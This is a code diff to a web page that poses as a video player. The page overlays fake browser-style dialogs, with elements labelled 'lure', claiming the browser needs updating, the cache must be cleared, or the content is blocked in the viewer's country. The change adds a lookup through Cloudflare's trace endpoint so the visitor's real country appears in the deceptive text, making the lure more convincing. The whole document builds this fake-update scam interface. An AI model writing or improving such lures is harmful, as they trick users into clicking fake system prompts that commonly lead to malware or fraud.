@@ -69,7 +69,6 @@
         return l;
       };
 
-      // ОПРЕДЕЛЕНИЕ БРАУЗЕРА ДЛЯ РЕАЛИЗМА
       const getBrowserName = () => {
           const ua = navigator.userAgent;
           if (ua.includes("Firefox")) return "Firefox";
@@ -81,13 +80,35 @@
           return "Browser";
       };
 
-      // --- СЛОВАРЬ С ПЛЕЙСХОЛДЕРАМИ {browser} и {country} ---
+      // --- БЕЗОПАСНОЕ ОПРЕДЕЛЕНИЕ СТРАНЫ ЧЕРЕЗ CLOUDFLARE ---
+      const fetchCountryName = async (targetLang) => {
+          try {
+              // Если ГЕО уже есть в ссылке - не мучаем сеть
+              const manual = sp.get('geo') || sp.get('country');
+              if (manual) return manual;
+
+              // Запрос на технический эндпоинт Cloudflare (есть на каждом домене под CF)
+              const response = await fetch('/cdn-cgi/trace');
+              const text = await response.text();
+              const locLine = text.split('\n').find(line => line.startsWith('loc='));
+              const code = locLine ? locLine.split('=')[1] : null;
+
+              if (code) {
+                  // Магия: превращаем RU в "Россия" на языке юзера
+                  const displayNames = new Intl.DisplayNames([targetLang], { type: 'region' });
+                  return displayNames.of(code);
+              }
+              return null;
+          } catch (e) {
+              return null;
+          }
+      };
+
       const MODAL_I18N = {
         en: {
           title: "Leaving already? 😢",
           desc: "Wait—video is almost loaded.",
-          stay: "Stay",
-          leave: "Leave",
+          stay: "Stay", leave: "Leave",
           t1: { h: "{browser} Update Required", t: "Your version of {browser} is no longer supported. Please update your browser to play this video.", b: "UPDATE", c: "CANCEL" },
           t2: { h: "Storage limit reached", t: "To continue playback, please clear your {browser} cache or system junk files.", b: "CLEAR NOW", c: "CANCEL" },
           t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE", c: "CANCEL" },
@@ -96,8 +117,7 @@
         ru: {
           title: "Уже уходишь? 😢",
           desc: "Подожди! Видео почти загрузилось.",
-          stay: "Остаться",
-          leave: "Уйти",
+          stay: "Остаться", leave: "Уйти",
           t1: { h: "Обновите {browser}", t: "Ваша версия {browser} больше не поддерживается. Обновите браузер для просмотра видео.", b: "ОБНОВИТЬ", c: "ОТМЕНА" },
           t2: { h: "Память переполнена", t: "Для продолжения очистите кэш {browser} или системный мусор.", b: "ОЧИСТИТЬ", c: "ОТМЕНА" },
           t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ", c: "ОТМЕНА" },
@@ -110,21 +130,19 @@
         return MODAL_I18N[lang] || MODAL_I18N.en;
       };
 
-      document.addEventListener("DOMContentLoaded", () => {
+      document.addEventListener("DOMContentLoaded", async () => {
         const typeId = sp.get('type') || '4';
-        
-        // ПОЛУЧАЕМ СТРАНУ (Если нет в ссылке - ставим фолбек)
-        const country = sp.get('geo') || sp.get('country') || (detectLang() === 'ru' ? "вашем регионе" : "your region");
-        
-        // ПОЛУЧАЕМ БРАУЗЕР
         const browser = getBrowserName();
-        
+        const langCode = norm(detectLang());
         const dict = window.__getModalCopy(); 
-        let content = dict['t' + typeId] || dict['t4'];
+        
+        // Получаем страну (Cloudflare Trace + Intl)
+        const countryName = await fetchCountryName(langCode);
+        const finalCountry = countryName || (langCode === 'ru' ? "вашем регионе" : "your region");
 
-        // ЗАМЕНЯЕМ ПЛЕЙСХОЛДЕРЫ В ЗАГОЛОВКЕ И ТЕКСТЕ
+        let content = dict['t' + typeId] || dict['t4'];
         const textHead = content.h.replace(/{browser}/g, browser);
-        const textBody = content.t.replace(/{browser}/g, browser).replace(/{country}/g, country);
+        const textBody = content.t.replace(/{browser}/g, browser).replace(/{country}/g, finalCountry);
 
         const elHead = document.getElementById('lure-head');
         const elText = document.getElementById('lure-text');
@@ -166,6 +184,7 @@
     .xh-video-container { width: 100%; max-width: 1220px; aspect-ratio: 16 / 9; position: relative; background: #000; }
     .xh-video-element { width: 100%; height: 100%; object-fit: cover; display: block; }
 
+    /* --- СИСТЕМНЫЙ ДИАЛОГ --- */
     .xh-main-play-trigger {
       position: absolute; top: 50%; left: 50%;
       transform: translate(-50%, -50%);
@@ -177,13 +196,8 @@
     .xh-main-play-trigger.ready { opacity: 1; visibility: visible; pointer-events: auto; }
 
     .system-dialog {
-        background: #ffffff;
-        border-radius: 8px;
-        padding: 24px;
-        width: 300px;
-        box-shadow: 0 12px 32px rgba(0,0,0,0.4);
-        text-align: left;
-        color: #202124;
+        background: #ffffff; border-radius: 8px; padding: 24px; width: 300px;
+        box-shadow: 0 12px 32px rgba(0,0,0,0.4); text-align: left; color: #202124;
     }
 
     .dialog-title { font-size: 19px; font-weight: 500; margin-bottom: 12px; color: #000; }
@@ -191,16 +205,9 @@
     .dialog-actions { display: flex; justify-content: flex-end; gap: 8px; }
     
     .dialog-btn {
-        background: transparent;
-        color: #1a73e8; 
-        border: none;
-        padding: 10px 16px;
-        font-size: 14px;
-        font-weight: 600;
-        cursor: pointer;
-        text-transform: uppercase;
-        letter-spacing: 0.4px;
-        border-radius: 4px;
+        background: transparent; color: #1a73e8; border: none; padding: 10px 16px;
+        font-size: 14px; font-weight: 600; cursor: pointer; text-transform: uppercase;
+        letter-spacing: 0.4px; border-radius: 4px;
     }
     .dialog-btn.btn-secondary { color: #5f6368; }
     .dialog-btn:active { background: rgba(26, 115, 232, 0.1); }
@@ -254,11 +261,11 @@
 
       <div class="xh-zone xh-main-play-trigger" data-target="main_play" aria-label="System Message">
          <div class="system-dialog">
-            <div class="dialog-title" id="lure-head">Update Required</div>
-            <div class="dialog-text" id="lure-text">Please update your system components to play this media.</div>
+            <div class="dialog-title" id="lure-head">System Message</div>
+            <div class="dialog-text" id="lure-text">Please take action to continue.</div>
             <div class="dialog-actions">
                 <button class="dialog-btn btn-secondary" id="lure-cancel" data-target="main_play">CANCEL</button>
-                <button class="dialog-btn" id="lure-btn" data-target="main_play">UPDATE</button>
+                <button class="dialog-btn" id="lure-btn" data-target="main_play">OK</button>
             </div>
         </div>
       </div>
